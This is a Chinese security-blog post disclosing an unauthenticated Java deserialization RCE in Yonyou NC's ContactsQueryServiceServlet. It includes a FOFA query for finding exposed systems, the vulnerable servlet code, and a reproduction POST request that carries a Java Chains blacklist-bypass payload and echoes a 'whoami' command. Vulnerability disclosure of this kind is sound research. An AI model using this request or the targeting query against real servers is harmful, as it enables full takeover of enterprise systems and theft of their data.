---
title: "用友NC ContactsQueryServiceServlet反序列化代码执行RCE漏洞"
source: https://mrxn.net/jswz/yonyou-nc-ContactsQueryServiceServlet-rce.html
asset_dir: assets/用友nc-contactsqueryserviceservlet反序列化代码执行rce漏洞
---

# 用友NC ContactsQueryServiceServlet反序列化代码执行RCE漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/10/8 08:37
* 831浏览
* [0评论](#comment)
* 13分钟阅读

深入探索

服务器安全服务

计算机安全

安全认证考试


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)NC是用公司推出的一款企业管理软件，涵盖财务、供应链、生产制造等多个业务领域，旨在帮助企业实现信息化管理。用友NC的`ContactsQueryServiceServlet`组件存在反序列化漏洞。该Servlet在处理用户请求时，可能对接收到的序列化数据（如Java的`ObjectInputStream`）未进行安全检查，直接进行反序列化操作。攻击者可以构造恶意的序列化对象，其中包含可执行的代码，当`ContactsQueryServiceServlet`反序列化该恶意对象时，就会触发代码执行。该漏洞可能允许攻击者在服务器上[执行任意代码](https://mrxn.net/tag/rce)，从而完全控制服务器，窃取敏感数据，篡改系统配置，或进行其他恶意活动，对企业的业务系统和数据安全构成严重威胁。

漏洞修复方案

# 影响版本

NC 65

# fofa语法

> app="用友-UFIDA-NC"

# 漏洞分析

直接看下`ContactsQueryServiceServlet`的实现

```
public class ContactsQueryServiceServlet extends HttpServlet {
    private static final long serialVersionUID = -3711153542187076118L;

    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        ObjectInputStream in = new ObjectInputStream(request.getInputStream());
        HashMap<Object, Object> headInfo = new HashMap();

        try {
            headInfo = (HashMap)in.readObject();
```

由于代码在处理 HTTP 请求时，直接对用户传入的输入流进行 Java 反序列化操作（**`in.readObject()`**），且该操作发生在任何身份验证或安全检查之前，造成了未经身份验证的**远程代码执行（[RCE](https://mrxn.net/tag/rce)）漏洞**。攻击者可以构造恶意的序列化数据流，在服务器反序列化时执行任意代码。

物流软件安全

# 漏洞复现

```
POST /servlet/ContactsQueryServiceServlet?pageId=login HTTP/1.1
Host: nc.mrxn.net
Content-Type: application/x-java-serialized-object
X-Authorization: whoami

{{file(/tmp/javachains.ser)}}
```

使用`Java Chains` 的`TransformerWithDefiningClassLoader2`构造**绕黑名单**进行[命令执行](https://mrxn.net/tag/rce)回显payload

[![用友NC ContactsQueryServiceServlet反序列化代码执行RCE漏洞](images/img-001-b57541fc0e74.webp)](https://image.mrxn.net/9f4fd82858d74bb49e1dc0bdab7ecf70.webp)

[![用友NC ContactsQueryServiceServlet反序列化代码执行RCE漏洞](images/img-002-918c8d4d22d5.webp)](https://image.mrxn.net/e76132b15c9f47a1839a840dcb47614d.webp)

成功执行命令并回显执行结果

安全运维咨询

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#rce](https://mrxn.net/tag/rce)
* [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[用友NC ContactsQueryServiceServlet反序列化代码执行RCE漏洞](https://mrxn.net/jswz/yonyou-nc-ContactsQueryServiceServlet-rce.html)  
文章链接：<https://mrxn.net/jswz/yonyou-nc-ContactsQueryServiceServlet-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-ContactsQueryServiceServlet-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

漏洞修复方案

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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